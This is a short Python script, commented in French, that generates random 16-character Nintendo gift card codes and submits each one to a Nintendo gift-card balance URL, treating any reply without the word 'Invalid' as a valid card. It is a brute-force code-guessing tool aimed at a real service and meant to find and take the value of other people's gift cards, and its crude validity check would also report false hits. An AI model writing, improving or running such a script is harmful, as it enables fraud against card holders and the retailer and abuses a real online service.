import random
import requests

# fonction pour générer un code de carte cadeau aléatoire
def generate_gift_card_code():
  # liste des caractères autorisés dans les codes de cartes cadeaux Nintendo
  characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

  # génération d'un code de 16 caractères en choisissant aléatoirement parmi les caractères autorisés
  code = ''.join(random.choices(characters, k=16))
  return code

# fonction pour tester un code de carte cadeau
def test_gift_card_code(code):
  # envoi d'une requête HTTP POST pour vérifier si le code est valide
  url = 'https://www.nintendo.com/gift-card-balance'
  data = {'gift_card_number': code, 'pin': '', 'device_id': '', 'country': 'US'}
  response = requests.post(url, data=data)

  # si la réponse contient le mot 'Invalid', le code n'est pas valide
  if 'Invalid' in response.text:
    return False
  else:
    return True

# génération et test de 100 codes de cartes cadeaux
for i in range(100):
  code = generate_gift_card_code()
  is_valid = test_gift_card_code(code)
  print(f'Code {code}: {is_valid}')
